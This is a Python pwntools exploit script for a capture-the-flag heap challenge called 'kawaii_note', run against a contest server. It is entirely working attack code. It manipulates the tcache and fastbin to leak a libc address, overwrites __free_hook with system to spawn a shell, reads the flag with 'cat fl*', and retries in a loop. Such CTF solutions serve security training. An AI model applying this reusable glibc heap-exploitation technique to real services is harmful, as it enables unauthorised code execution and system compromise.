from pwn import *

def login():
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("Username: ", "1")
    p.sendlineafter("Choice: ", "2")
    p.sendlineafter("Username: ", "1")

def new(idx, length, info):
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("Index: ", str(idx))
    p.sendlineafter("Size: ", str(length))
    p.sendlineafter("Note: ", info)

def new2(idx, length, info):
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("Index: ", str(idx))
    p.sendlineafter("Size: ", str(length))
    p.sendafter("Note: ", info)
    sleep(0.1)

def delete(idx):
    p.sendlineafter("Choice: ", "2")
    p.sendlineafter("Index: ", str(idx))

libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

#for i in range(1):
while(1):
    try:
        #p = process("./kawaii_note")
        p = remote("kawaii-note.balsnctf.com", 7123)

        login()

        # heap_base = int(input(), 16)
        for i in range(0, 10):
            new(i, 0x2c0, b"")

        for i in range(1, 4):
            delete(i)

        for i in range(6, 10):
            delete(i)
        delete(4)
        delete(5)

        #0-6 tcache 7-9 fastbin
        for i in range(0, 8):
            new(i, 0x50, b"\xa8")

        for i in range(0, 7):
            delete(i)

        for i in range(9, -1, -1):
            new(i, 0x20, b"\xa8")
        for i in range(0, 10):
            delete(i)
        delete(7)
        for i in range(0, 7):
            new(i, 0x20, b"\xa8")
        new(0, 0x20, b"")

        new(0, 0x20, b"")
        new(0, 0x20, b"")
        new(0, 0x20, b"")
        new(0, 0x20, b"\x63")
       
        p.sendline("3")
        p.sendline("2")
        p.sendline("1")
        print(p.recvuntil(p64(0x000000006ffffffe), timeout = 1))
        print(p.recvuntil(p64(0x000000006ffffffe), timeout = 1))
        leak = p.recv(0x200)
        print(leak)
        leak = leak.split(b'\x7f')[-2]
        libc_leak = u64((b'\x00\x00\x7f' + leak[::-1][0:5])[::-1])
        libc_base = libc_leak - 0x4a090
        print(hex(libc_leak))
        print(hex(libc_base))
        for i in range(0, 10):
            new(i, 0x50, "A")
        for i in range(0, 10):
            delete(i)
        delete(7)

        for i in range(0, 7):
            new(i, 0x50, "A")
        new(0, 0x50, p64(libc_base+libc.symbols['__free_hook']))
        new(0, 0x50, p64(libc_base+libc.symbols['__free_hook']))
        new(0, 0x50, p64(libc_base+libc.symbols['__free_hook']))
        new(0, 0x50, p64(libc_base+libc.symbols['system']))
        new(0, 0x100, "/bin/sh\x00")
        delete(0)
        p.sendline("cat fl*")

        p.interactive()

    except:
        try:
            p.close()
        except BrokenPipeError:
            continue
